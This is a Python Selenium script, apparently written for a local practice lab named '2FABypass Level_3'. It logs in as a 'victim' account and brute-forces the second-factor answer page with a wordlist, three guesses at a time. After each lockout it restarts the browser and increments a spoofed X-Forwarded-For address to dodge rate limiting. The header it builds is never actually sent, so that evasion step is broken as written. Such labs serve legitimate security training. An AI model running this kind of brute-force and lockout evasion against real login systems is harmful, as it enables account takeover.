import os
from selenium import webdriver
from selenium.webdriver.common.by import By
import time

# Betiğin bulunduğu dizini manuel olarak ayarla
current_directory = r'C:\xampp\htdocs\php\2FABypass\Level_3'  # Lütfen kendi dizin yolunuzu girin

# Dosyanın tam yolunu oluştur
file_path = os.path.join(current_directory, "answer.txt")

# Tarayıcıyı başlat
driver = webdriver.Chrome()

x_forwarded_for = 200  # X-Forwarded-For değerini 100'den başlat

def login():
    # Login sayfasına git
    driver.get("http://localhost/php/2FABypass/Level_3/login.php")
    
    # E-posta ve şifre bilgilerini doldur
    mail_input = driver.find_element(By.NAME, "email")
    pass_input = driver.find_element(By.NAME, "password")
    mail_input.send_keys("victim@gmail.com")
    pass_input.send_keys("pass")

    # Login butonuna tıkla
    driver.find_element(By.CLASS_NAME, "input-submit").click()

# X-Forwarded-For değerini artırarak tekrar login ol
def login_with_x_forwarded_for(x_forwarded_for_value):
    global driver
    driver.quit()
    options = webdriver.ChromeOptions()
    options.add_argument(f"--proxy-server='http://127.0.0.1:8888'")
    options.add_argument(f"--disable-extensions")
    options.add_argument(f"--start-maximized")
    options.add_argument(f"--disable-gpu")
    options.add_argument(f"--disable-dev-shm-usage")
    options.add_argument(f"--no-sandbox")
    options.add_argument(f"--disable-software-rasterizer")
    options.add_argument(f"--disable-setuid-sandbox")
    options.add_argument(f"--no-first-run")
    options.add_argument(f"--disable-features=VizDisplayCompositor")

    headers = {'X-Forwarded-For': f'192.168.1.{x_forwarded_for_value}'}
    options.add_experimental_option('prefs', {'profile.managed_default_content_settings.images': 2})
    driver = webdriver.Chrome(options=options)
    login()

# answer.txt dosyasından kavramları oku
kavramlar = []
with open(file_path, "r") as file:
    kavramlar = file.read().splitlines()

sayac = 0  # Kavramları denemek için sayaç

while True:
    if "confirmCode.php" in driver.current_url:
        for i in range(sayac, sayac + 3):  # Sayac ile bir sonraki 3 kavramı seç
            if i < len(kavramlar):
                kavram = kavramlar[i]
                try:
                    answer_input = driver.find_element(By.NAME, "answer")
                    answer_input.clear()
                    answer_input.send_keys(kavram)
                    driver.find_element(By.CLASS_NAME, "input-submit").click()
                    time.sleep(1)
                    print(f"Denenen kavram: {kavram}")
                except:
                    print(f"Hata! Kavram girişi sırasında bir sorun oluştu: {kavram}")
        sayac += 3  # 3 kavramı denediğimiz için sayaçı güncelle
    try:
        if "badEnding.php" in driver.current_url:
            # Hata durumunda, badEnding.php sayfasına yönlendirildi
            # X-Forwarded-For değerini artırarak tekrar login ol
            print("Hata! badEnding.php sayfasına yönlendirildi. Yeniden giriş yapılıyor...")
            x_forwarded_for += 1
            login_with_x_forwarded_for(x_forwarded_for)
    except Exception as e:
        print(f"Hata oluştu: {e}")

    if "goodEnding.php" in driver.current_url:
        print("Yarışmayı kazandınız!")
        break  # Kazandıktan sonra döngüyü kır
